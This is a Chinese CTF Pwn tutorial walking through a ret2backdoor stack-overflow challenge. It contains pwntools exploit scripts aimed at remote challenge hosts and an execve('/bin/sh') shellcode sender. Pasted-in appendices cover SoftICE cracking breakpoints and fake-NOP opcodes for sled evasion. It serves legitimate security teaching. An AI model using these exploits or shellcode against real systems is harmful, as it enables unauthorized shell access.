## Pwn

本周的 Pwn 考查一些工具的基本使用，可以阅读 [Pwn 环境配置](https://ns.openctf.net/learn/configure-pwn.html)，并熟悉其中提到的工具。

对于快速入门和解题样例，可以阅读 [Pwn | 快速入门 - NewStar CTF](https://ns.openctf.net/learn/pwn.html)。

# Pwn

## 0xFF. Pwn 是干什么的？好吃🐎？

Pwn 是由 own 引申而来的，它表示玩家处于胜利的优势。在黑客语法的俚语中，Pwn 是指攻破设备或者系统，发音类似「砰」。对黑客而言，利用一些漏洞成功实施黑客攻击，获取到服务器的权限并操纵，那么，This server just got pwned！

Pwn 需要的不仅是基本的 C 语言、汇编语言以及逆向功底，还有程序运行相关的知识。因此，你也可以选择先在逆向（Reverse）方向深造，当有一定了解后再来学习 Pwn 便会轻便许多。

## 0x00. 解决 Pwn 题目的基本流程

题目附件会提供可执行文件，需要使用 IDA、Ghidra 等反汇编工具对其进行静态分析，找到其中存在的漏洞。

之后将程序在本地运行，经过动态调试分析，写出攻击脚本，本地拿到一定权限之后就可以进行远程的攻击了。

**TIP**

攻击脚本一般使用 Python 配合一些工具库进行编写较为方便，你需要掌握 Python 的数据类型、函数等基础知识。

## 0x01. Pwn 环境搭建

请先确保你具备 Ubuntu（建议用近几年的 Ubuntu，比如 22.04 LTS、24.04 LTS） 操作系统。随后可以准备以下软件或工具：

- IDA/Ghidra（IDA 为 Windows 平台下的工具）
- pwntools
- gdb 及其插件
- ROPgadget
- one_gadget

**INFO**

下载传送门：[IDA Pro 8.3](https://down.52pojie.cn/Tools/Disassemblers/IDA_Pro_v8.3_Portable.zip)

对于 Pwn 环境搭建，可参考 [Pwn 环境搭建](https://ns.openctf.net/learn/configure-pwn.html)，或 [Pwn 22.04 环境搭建保姆级教程](https://blog.csdn.net/j284886202/article/details/134931709)。

除此之外还建议在 Ubuntu 装个趁手的代码编辑器，如 [VSCode](https://code.visualstudio.com/).

**TIP**

由于国内网络环境，使用 Pip 等包管理工具时可能遇到下载缓慢、无法下载等情况，可自行网络搜索配置镜像源。

如 Pip 镜像配置可参照 [清华大学软件源 PyPI](https://mirror.tuna.tsinghua.edu.cn/help/pypi/).

## 0x02. 前期 Pwn 的基本学习路线

首先前置知识有基础的 C 语言、汇编、ELF 程序的加载运行知识。

**前置 C 语言知识：**

- 程序结构、基础语法
- 数据类型、变量、常量以及变量作用域
- `if` `switch` 分支语句、`for` `while` `do while` 循环
- 函数和变量生命周期
- 数组、字符串、结构体
- 指针、函数指针
- 指针的运算、解指针操作，以及与数组、字符串等常见类型的关系
- 基本类型（如 `int` `long long` `char` 和指针等）的类型大小
- 输入输出
- 文件读写
- 强制类型转换
- 一个字段在结构体中的偏移
- 常见不安全函数的特性（如 `scanf` `gets` `read` `memcpy` 等）
- 堆栈（指的是程序运行中的堆和栈）等底层数据结构

**前置汇编知识：**

- 寄存器
- x86_64 汇编的阅读和简单的编写
- 其他架构（如 Arm、Risc-v）汇编的阅读能力
- 内存寻址
- 函数调用以及栈帧变化
- 中断

**ELF 相关知识：**

- ELF 文件的结构：ELF每个段的作用、保护等
- 程序的加载、动态链接、静态链接
- ELF 程序的保护（如 Canary、PIE、RELRO、NX）

**Pwn 知识：**

- ret2text/ret2backdoor
- 整数溢出
- ROP
- 静态链接与动态链接
- ret2libc
- shellcode 编写与 ret2shellcode
- ret2syscall
- ret2dl_resolve
- 格式化字符串漏洞
- 伪随机数漏洞
- 栈迁移
- one_gadget

## 0x03. Pwn 基础

### x86_64 汇编部分

#### 寄存器

一个比较容易理解的方法就是把寄存器当作 C 语言中的变量，寄存器的顺序都是有规律的。

例如，`r` 开头的为 64 位寄存器（看作 `unsigned long long`），如

- `rax` `rbx` `rcx` `rdx` `rdi` `rsi` `rsp` `rbp` `rip`
- `r8` `r9` `r10` `r11` `r12` `r13` `r14` `r15`

例如，`e` 开头的是 32 位寄存器（看作 `unsigned int`），如

- `eax` `ebx` `ecx` `edx` `edi` `esi` `esp` `ebp` `eip`

其中 `eax` 是 `rax` 的低 4 字节，其它的以此类推。

#### 数据类型

- 1 字节 `BYTE`
- 2 字节 `WORD`
- 4 字节 `DWORD`
- 8 字节 `QWORD`

#### 基础汇编语句

以下是 Intel 格式汇编语句的例子：

**ASM**

```plain
mov rax, 1           ; 将 rax 的值赋值为 1
mov rax, rdi         ; 将 rdi 存储的值赋值给 rax
mov rax, [0x404000]  ; 将 0x404000 存储的内容复制到 rax 里面
mov [rdx], rax       ; 将 rax 的值存储到 rdx 存储的指针指向的地方
```

除此之外比较类似的还有 `add` `sub` 等指令。

**ASM**

```plain
lea  rax, [rdx+0x10] ; 将 rdx+0x10 指针赋值给 rax
push rax             ; 将 rax 的值 push 到栈上面。
pop  rax             ; 将栈顶的值 pop 到 rax 寄存器里面。
```

### ELF 相关知识

#### ELF 结构

ELF 文件每个部分都是分段的。

IDA中，按下 **⇧ Shift****F7** 即可查看

几个比较重要的段（Section）的作用：

- `.text` 段：存储程序的代码，具有可读可执行权限，不可写
- `.bss` 段：存储没有赋初值的全局变量，可读可写
- `.data` 段：存储已经赋初值的全局变量，可读可写
- `.rodata` 段：存储全局常量，比如常量字符串等，仅仅可读

## 0x04. Pwn 题目解题示例

我们以一个 ret2backdoor 的题目为例子。

### 题目内容

[附件下载](https://cdn.openicu.net/attachment/ns-learn/pwn.302dfe7937adcda6.zip)

靶机连接：

**bash**

```plain
nc 120.53.240.208 6000
```

### 题目分析以及解题

首先下载下来附件并且解压，得到文件 `pwn`.

将其复制进虚拟机并且当前文件夹打开终端，给予文件可执行权限。

**bash**

```plain
chmod +x ./pwn
```

使用 `file` 以及 `checksec` 命令查看文件信息以及保护开启状态。

![img](./source/imgs/Pwn%E6%80%9D%E8%B7%AF/1730029335128-473eea37-cf69-4917-b83f-c15f577df4d7.png)

用 IDA 打开。

![img](./source/imgs/Pwn%E6%80%9D%E8%B7%AF/1730029335128-6e414421-cf04-4396-b13f-0f40a1d67b7b.png)

现在显示的就是 `main` 函数的汇编代码，按下 **F5**，就可以对当前函数进行反汇编为 C 语言。

最左边一栏就是当前程序的函数列表，双击就可以打开函数查看。

![img](./source/imgs/Pwn%E6%80%9D%E8%B7%AF/1730029334714-ce91da46-b3fa-4d71-994f-34d842a03c7d.png)

双击函数名称即可查看当前函数的反汇编代码实现。

可以点击 `init` 函数进行查看。因为 `read` 函数是库函数，实现位于 `libc.so.6` 的库中（有些版本文件名是 `libc-?.??.so`）所以点开发现只有一行红色的 `read`.

通过对 `main` 函数反汇编代码我们可以了解到程序的功能就是往 `buf` 里面使用 `read` 函数进行读入（最大长度 `0x100` 字节）。

`buf` 是个局部变量，位于栈中。

我们双击 `buf` 变量就可以查看当前函数的栈帧结构。

![img](./source/imgs/Pwn%E6%80%9D%E8%B7%AF/1730029334713-19fd5ee6-5d44-4b75-b382-e4ba5cdb8aef.png)

我们可以知道当前 `buf` 的长度为 16 字节，并且

- `_QWORD __saved_registers;` 对应的是栈帧存储的 `rbp_old`；
- `_UNKNOWN *__return_address;` 对应当前函数的返回地址处。

我们可以读入的字节长度最长 `0x100` 远大于 16，就导致我们可以修改当前栈帧的 `rbp_old` 以及函数的返回地址，就可以劫持程序的执行流了。

我们发现程序存在 `backdoor` 函数，里面执行的是 `system("/bin/sh")`.

这句代码的功能就是执行 `/bin/sh`，即获取 shell，我们只要能把程序执行流劫持到这里就能拿到 shell 了。

之后我们开始写利用脚本（Exploit）。创建 `exp.py` 文件，首先写上最基本的框架：

**python**

```plain
from pwn import *

context.log_level='debug'
context(arch='amd64', os='linux')

ELFpath = './pwn'
p = process(ELFpath)
gdb.attach(p)

p.interactive()
```

我们要往 `buf` 写入的东西就是「16 个随便的字符」+「8 字节的 rbp_old」+「8字节的函数返回地址」，即 `b'a'*0x10 + p64(0) + p64(0x4011BD)`.

这样我们就能更改 `rbp_old` 的数值为 0，更改函数的返回地址到 `0x4011BD`.

然后我们使用 `send` 函数与程序进行交互。

**python**

```plain
from pwn import *

context.log_level='debug'
context(arch='amd64', os='linux')

ELFpath = './pwn'
p = process(ELFpath)
gdb.attach(p)

p.send(b'a'*0x10 + p64(0) + p64(0x4011BD))

p.interactive()
```

之后在终端运行 `exp.py` 脚本。

![img](./source/imgs/Pwn%E6%80%9D%E8%B7%AF/1730029335968-7cef3564-458d-44dd-b656-e55636bd0901.png)

可以看到我们已经成功运行了，而且通过 `gdb.attach()` 成功开启 gdb 进行调试。

下面是 gdb/pwndbg 常用的命令：

- `ni`: 执行到当前函数的下一条汇编指令
- `si`: 单步步入，和 `ni` 的区别就是 call（调用）函数的时候会一步步进入所 call 的函数，而不是像 `ni` 那样直接跳过
- `fin`: 执行至当前函数结束
- `q`: 退出gdb
- `vmmap`: 查看当前内存中的每个段的信息
- `tele 0x????`: 查看地址为 `0x????` 的内存中存储的内容

![img](./source/imgs/Pwn%E6%80%9D%E8%B7%AF/1730029335141-c8b1a54d-637b-4a82-a91b-3c6e9ce7d095.png)

我们执行到 `main` 函数结束的地方，就可以看到我们成功劫持程序的执行流到 `backdoor` 函数。

![img](./source/imgs/Pwn%E6%80%9D%E8%B7%AF/1730029335581-2e4e75bd-af2d-4b3c-ba38-0f0a1f3325ae.png)

但是程序卡在了 system 函数的内部的一条命令:

**ASM**

```plain
0x7e3aee45842b <do_system+363>    movaps xmmword ptr [rsp + 0x50], xmm0
```

这个命令涉及到 `xmm` 寄存器，`xmm` 寄存器为 128 位，需要 `rsp+0x50` 的最低一个 16 进制位为 `0`.

一个可行的应对方法就是我们可以劫持程序的执行流到 `0x4011C2` 处，这样就能跳过一个 `push` 命令，`rsp` 自然就多了 8，就满足了 `xmm` 寄存器的要求。

修改一下地址就能拿到 shell 了

**python**

```plain
from pwn import *

context.log_level='debug'
context(arch='amd64', os='linux')

ELFpath = './pwn'
p = process(ELFpath)
gdb.attach(p)
p.send(b'a'*0x10 + p64(0) + p64(0x4011C2))
p.interactive()
```

![img](./source/imgs/Pwn%E6%80%9D%E8%B7%AF/1730029335637-1f5ffd94-44d2-4556-bc29-c56e2e3c18f4.png)

之后注释掉 `process` 函数与 `gdb.attach` 函数，换 `remote` 函数打远程靶机即可：

**python**

```plain
p = remote('120.53.240.208', 6000)
```

![img](./source/imgs/Pwn%E6%80%9D%E8%B7%AF/1730029335598-ce457602-96ac-45eb-940e-8696c211dcb3.png)

远程利用成功。



###### shellcode

```plain
from pwn import *

# 连接到远程服务器
io = remote('172.18.206.152', 10004)
# 预定义的64位Linux shellcode
# 这个shellcode执行 execve("/bin/sh", 0, 0)
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# 接收提示并发送shellcode
io.recvuntil(b"Please input your shellcode: ")
io.send(shellcode)

# 与shell交互
io.interactive()
```





汇编指令：相关文章

1、汇编对应机器码大全----http://wenku.baidu.com/link?url=GeRgqDNM40TlJtIz2RCWGd8o1uCeLCT_ZJ3d4wNA_ZQm_7uGcJ7YF3JKV8_lyFNYoRIYs3ue7-80GNrOnHlfDoGjSFgQeqhqdfAWCfBJBle

2、X86-汇编指令与机器码对照表  ----http://download.csdn.net/detail/edward30/8400079

3、[技术交流] 汇编指令与机器码的相互转换【转】----http://bbs.fishc.com/thread-34304-1-1.html



一、汇编速查
MOV   AA,BB         将   BB   放到   AA   里
CALL                   调用子程序   (相当于   BASIC   的   GOSUB)
RET   与   RETF     返回程序       (相当于   BASIC   的   RETURN)
CMP   XX,YY         比较   XX   与   YY
JZ                       若相等则转移
JNZ                     若不相等则转移
JB                       若小于则转移
JG                       若大于则转移
JMP                     无条件转移
J???                   (各种转移指令)
LOOP                   循环直到CX为0
INT   XX               类似   CALL   的中断涵数
PUSH   推入栈（STACK）ESP：PUSH   AX
POP   出栈ESP：POP   CX
XCHG   交换ESP：XCHG   AX，BX
IN、OUT   与PORT有关的IN/OUT
XLAT   查表
LEA   段内偏移量。ESP：LEA   AX，AREA1=MOV   AX，OFFSET   AREA1
LAHF、SAHF与棋标有关的寄存器   AH
PUSHF、POPF将棋标入/出栈
ADD   ESP   ADD   AX，CX   （AX=AX+CX）
ADC   加入棋标C的ADD
INC   ESP   INC   AX（AX=AX+1）
AAA   加法校正
SUB、SBB   减法
DEC   ESP：   DEC   AX（AX=AX-1）
NEG   去补，
MUL、IMUL   乘
DIV、IDIV   除
SHR、SAR、SHL   算术、逻辑位移R=RIGHT   L=LEFT
OR、XOR、AND   逻辑运算   ESP   ：XOR   AX，AX（AX=0）      



直接标志转移
指令格式     机器码     测试条件     如...则转移
JC             72             C=1                 有进位
JNS           79             S=0                 正号
JNC           73             C=0                 无进位
JO             70             O=1                 有溢出
JZ/JE       74             Z=1                 零/等于
JNO           71             O=0                 无溢出
JNZ/JNE   75             Z=0                 不为零/不等于
JP/JPE     7A             P=1                 奇偶位为偶
JS             78             S=1                 负号
JNP/IPO   7B             P=0                 奇偶位为奇





  间接标志转移
指令格式                                 机器码                   测试格式                         如...则转移
JA/JNBE(比较无符号数)       77                           C或Z=0   >                      高于/不低于或等于
JAE/JNB(比较无符号数)       73                           C=0   >=                          高于或等于/不低于
JB/JNAE(比较无符号数)       72                           C=1   <                            低于/不高于或等于
JBE/JNA(比较无符号数)       76                           C或Z=1   <=                    低于或等于/不高于
JG/JNLE(比较带符号数)       7F                           (S异或O）或Z=0   >     大于/不小于或等于
JGE/JNL(比较带符号数)       7D                           S异或O=0   >=                大于或等于/不小于
JL/JNGE(比较带符号数)       7C                           S异或O=1   <                  小于/不大于或等于
JLE/JNG(比较带符号数)       7E                           (S异或O)或Z=1   <=      小于或等于/不大于
无条件转移指令JMP
指令格式                                       执行操作                               机器码           说明
段内直接短转移Jmp   short         (IP)←(IP)+8位位移量       EB                   转移范围-128到+127字节
段内直接近转移Jmp   near           (IP)←(IP)+16位位移量     E9                   转移到段内的任一位置
段内间接转移Jmp   word               (IP)←(有效地址EA)           FF
段间直接(远)转移Jmp   far         (IP)←(偏移地址)
(CS)←(段地址)                   EA
段间间接转移   Jmp                       dword   (IP)←(EA)
(CS)←(EA+2)
二、断点设置表
一般处理：
bpx   hmemcpy（万能断点）
bpx   MessageBox                                                 bpx   MessageBoxExA
bpx   MessageBeep                                               bpx   SendMessage
bpx   GetDlgItemText                                         bpx   GetDlgItemInt
bpx   GetWindowText                                           bpx   GetWindowWord
bpx   GetWindowInt                                             bpx   DialogBoxParamA
bpx   CreateWindow                                             bpx   CreateWindowEx
bpx   ShowWindow                                                 bpx   UpdateWindow
bmsg   xxxx   wm_move                                           bmsg   xxxx   wm_gettext
bmsg   xxxx   wm_command                                     bmsg   xxxx   wm_activate
bmsg   xxxx   wm_create                                       bmsg   xxxx   wm_destroy
时间相关:
bpint   21   if   ah==2A   (DOS)
bpx   GetLocalTime
bpx   GetFileTime
bpx   GetSystemtime
CD-ROM   或   磁盘相关:
bpint   13   if   ah2   (DOS)                               bpint   13   if   ah3   (DOS)
bpint   13   if   ah==4   (DOS)
bpx   GetFileAttributesA                                 bpx   GetFileSize
bpx   GetDriveType                                             bpx   GetLastError
bpx   ReadFile
bpio   -h   (Your   CD-ROM   Port   Address)   R
软件狗相关:
bpio   -h   278   R                                                   bpio   -h   378   R
文件访问相关:
bpint   21   if   ah3dh   (DOS)                           bpint   31   if   ah3fh   (DOS)
bpint   21   if   ah==3dh   (DOS)
bpx   ReadFile                                                     bpx   WriteFile
bpx   CreateFile                                                 bpx   SetFilePointer
bpx   GetSystemDirectory
INI   初始化文件相关:
bpx   GetPrivateProfileString                       bpx   GetPrivateProfileInt
bpx   WritePrivateProfileString                   bpx   WritePrivateProfileInt
注册表相关:
bpx   RegCreateKey                                             bpx   RegDeleteKey
bpx   RegCloseKey                                               bpx   RegOpenKey
bpx   RegQueryvalue
注册标志相关:   bpx   cs:eip   if   EAX==0
内存标准相关:   bpmb   cs:eip   rw   if   0x30:0x45AA==0
显示相关:   bpx   0x30:0x45AA   do   "d   0x30:0x44BB"
bpx   CS:0x66CC   do   "?   EAX"
利用S命令设断：
S   [-cu][address   L   length   data-list]
address :搜索的起始地址
length   :搜索的长度(字节长)
data-list :可以是一系列字节,也可以是字符串,   字符串可以用单引号或双引号括住
例如：S   30:0   L   ffffffff   '********'
三、经典句式
1         mov     eax   [             ]     这里可以是地址，也可以是其它寄存器
mov     edx   [             ]     同上     通常这两个地址就储存着重要信息
call   00??????
test   eax   eax
jz(jnz)
2         mov     eax   [             ]     这里可以是地址，也可以是其它寄存器
mov     edx   [             ]     同上     通常这两个地址就储存着重要信息
call   00??????
jne(je)
3         mov   eax   [       ]
mov   edx   [       ]
cmp   eax,edx
jnz(jz)
或者
begin:   mov   al   [       ]
mov   cl   [       ]
cmp   al,cl
jnz(jz)
mov   al   [     +1]
mov   cl   [     +1]
cmp   al,cl
jnz(jz)
cmp   eax   ecx   (eax为计数器）
jnl   begin
mov   al   01
4         lea   edi   [         ]
lea   esi   [         ]
repz   cmpsd
jz(jnz)
5         mov     eax   [             ]     这里可以是地址，也可以是其它寄存器
mov     edx   [             ]     同上     通常这两个地址就储存着重要信息
call   00??????
setz   (setnz)   al   (bl,cl…)
6         mov     eax   [             ]     这里可以是地址，也可以是其它寄存器
mov     edx   [             ]     同上     通常这两个地址就储存着重要信息
call   00??????
test   eax   eax
setz   (setnz)   bl,cl…
7         call   00??????     ***
push   eax   (ebx,ecx…)
……
call   00??????
pop   eax   (ebx,ecx…)
test   eax   eax
jz(jnz)  



intel   x86   类NOP   指令列表(修订版)
bkbll(bkbll@cnhonker.net)
2003/09/10
这篇文章是无聊的时候写的,   因为看到phrack   61上面的fake-nop的东东,   觉得有意思.
后来又受到eyas(cooleyas@21cn.com)的启发,从intel指令手册上找了找,下面是我试验通过可以替换NOP的指令.
注1:   这里不考虑双字节或以上的指令的fake-nop编码.
注2:   eyas加了xchg指令.
16进制机器码   x86汇编指令   指令意义   可能影响的寄存器或标志位   

------

  06   PUSHL   %es   es进栈   esp
0E   PUSHL   %cs   cs进栈   esp
16   PUSHL   %ss   ss进栈   esp
1E   PUSHL   %ds   ds进栈   esp
27   DAA   加法小数位调整   AF   CF   PF   SF   ZF   AL
2F   DAS   减法小数位调整   AF   CF   PF   SF   ZF   AL
37   AAA   加法的ASCII调整   AF   CF   AL
3F   AAS   减法小数位调整   AF   CF   AL
40   INC   %eax   %eax加1   AF   OF   PF   SF   ZF   eax
41   INC   %ecx   %ecx加1   AF   OF   PF   SF   ZF   ecx
42   INC   %edx   %edx加1   AF   OF   PF   SF   ZF   edx
43   INC   %ebx   %ebx加1   AF   OF   PF   SF   ZF   ebx
44   INC   %esp   %esp加1   AF   OF   PF   SF   ZF   esp
45   INC   %ebp   %ebp加1   AF   OF   PF   SF   ZF   ebp
46   INC   %esi   %esi加1   AF   OF   PF   SF   ZF   esi
47   INC   %edi   %edi加1   AF   OF   PF   SF   ZF   edi
48   DEC   %eax   %eax减1   AF   OF   PF   SF   ZF   eax
49   DEC   %ecx   %ecx减1   AF   OF   PF   SF   ZF   ecx
4A   DEC   %edx   %edx减1   AF   OF   PF   SF   ZF   edx
4B   DEC   %ebx   %ebx减1   AF   OF   PF   SF   ZF   ebx
4C   DEC   %esp   %esp减1   AF   OF   PF   SF   ZF   esp
4D   DEC   %ebp   %ebp减1   AF   OF   PF   SF   ZF   ebp
4E   DEC   %esi   %esi减1   AF   OF   PF   SF   ZF   esi
4F   DEC   %edi   %edi减1   AF   OF   PF   SF   ZF   edi
50   PUSHL   %eax   eax进栈   esp
51   PUSHL   %ecx   ecx进栈   esp
52   PUSHL   %edx   edx进栈   esp
53   PUSHL   %ebx   ebx进栈   esp
54   PUSHL   %esp   esp进栈   esp
55   PUSHL   %ebp   ebp进栈   esp
56   PUSHL   %esi   esi进栈   esp
57   PUSHL   %edi   edi进栈   esp
90   NOP   (NULL)   (NULL)
91   XCHG   %ecx,%eax   交换寄存器内容   eax,ecx
92   XCHG   %edx,%eax   交换寄存器内容   edx,eax
93   XCHG   %ebx,%eax   交换寄存器内容   ebx,eax
95   XCHG   %ebp,%eax   交换寄存器内容   ebp,eax
96   XCHG   %esi,%eax   交换寄存器内容   esi,eax
97   XCHG   %edi,%eax   交换寄存器内容   edi,eax
98   CBW   将byte的AL转换成word的EAX   EAX
9B   WAIT   等待CPU处理完数据   (NULL)
D6   无效指令   (NULL)   (NULL)
F5   CMC   转换CF标志位(开关)   CF
F8   CLC   清CF位(CF=0)   CF
F9   STC   设置CF位(CF=1)   CF
FC   CLD   设置DF位(DF=1)   DF
FD   STD   清理DF位(DF=0)   DF   

1. 上面利用XCHG/PUSHL/INC/DEC的方法程序应该不会出错,   可以正常到目的,   但寄存器内容被改变了.inc   eax就改变了eax的值,
   只能算无奈的办法.   
2. 利用改变标志寄存器位是个不错的想法,   基本上不会影响流程,   但看到还是改变了CPU的东西还是不满意.   
3. \x90(NOP),\x9b(wait),\xd6(bad)   这三个指令不错,   都不会改变程序的流程,   又不会改变寄存器的东东.
   这里尤其指明的是\xd6指令,   在intel手册上没查到对应什么指令,   但在linux下和windows下发现系统对于这个是继续
   执行下一条指令,和NOP相似.
   在我看来,上面这些指令利用顺序优先级最好是:
   \x90(NOP)   >   \xd6   >   \x9b   >   改变标志寄存器的操作指令   >   INC/DEC/PUSHL/XCHG
   //thx   to   eyas